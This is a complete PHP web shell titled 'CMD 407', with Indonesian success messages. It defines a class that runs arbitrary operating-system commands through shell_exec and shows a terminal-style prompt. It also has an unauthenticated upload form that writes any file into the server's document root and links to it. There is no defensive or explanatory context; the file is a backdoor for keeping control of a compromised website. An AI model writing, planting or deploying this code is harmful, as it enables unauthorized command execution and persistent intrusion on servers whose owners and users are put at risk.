<?php

error_reporting(0);
session_start();

class shell
{

    public function change_dir($cmd)
    {

        chdir(str_replace($_SERVER['PHP_SELF'], "", $_SERVER['SCRIPT_FILENAME']));
        $path = explode(" ", $cmd);

        if ($path[0] == "cd") {

            if (is_dir($path[1])) {

                $_SESSION['directory'] = $path[1];

            } else {

                $_SESSION['directory'] = getcwd();

            }

        }

    }

    public function user()
    {

        return get_current_user();

    }

    public function exe($cmd)
    {

        chdir($_SESSION['directory']);

        $check = explode(" ", $cmd);

        if ($cmd == "cd") {

            $_SESSION['directory'] = str_replace($_SERVER['PHP_SELF'], "", $_SERVER['SCRIPT_FILENAME']);

        } elseif ($check[0] == "cd") {

            shell::change_dir(str_replace(".", "", $cmd));

        } elseif ($result = shell_exec($cmd)) {

            return htmlspecialchars($result);

        } else {

            return htmlspecialchars($cmd) . ": command not found";

        }

    }

    public function term()
    {

        if (empty($_SESSION['directory'])) {

            $_SESSION['directory'] = getcwd();

        }

        return shell::user() . "@" . gethostname() . ":" . $_SESSION['directory'] . " $ ";

    }
}
?>
<!DOCTYPE html>
<html>

<head>
    <title>CMD 407</title>
    <style>
    * {
        background: black;
        color: green;
    }

    textarea {
        width: 100%;
        height: 400px;
        border: 1px solid transparent;
    }

    .kotak {
        height: 400px;
        padding: 20px;
        border: 1px solid green;
    }

    input[type="text"] {
        border: 0px solid transparent;
        color: white;
        background: transparent;
    }

    .res {
        overflow: auto;
    }
    </style>
</head>
<? echo "<form method='post' enctype='multipart/form-data'>
      <input type='file' name='idx_file'>
      <input type='submit' name='upload' value='upload'>
      </form>";
$wibu = $_SERVER['DOCUMENT_ROOT'];
$bawang = $_FILES['idx_file']['name'];
$ibh = $wibu.'/'.$bawang;
if(isset($_POST['upload'])) {
    if(is_writable($wibu)) {
        if(@copy($_FILES['idx_file']['tmp_name'], $ibh)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "Sukses, file --><a href='$web/$bawang' target='_blank'><b><u>$web/$bawang</u></b></a>";
        } else {
            echo "failed";
        }
    } else {
        if(@copy($_FILES['idx_file']['tmp_name'], $bawang)) {
            echo "Sukses<b>$bawang</b>";
        } else {
            echo "failed";
        }
    }
} ?>
<body>
 
    </form>
</body>



</html>
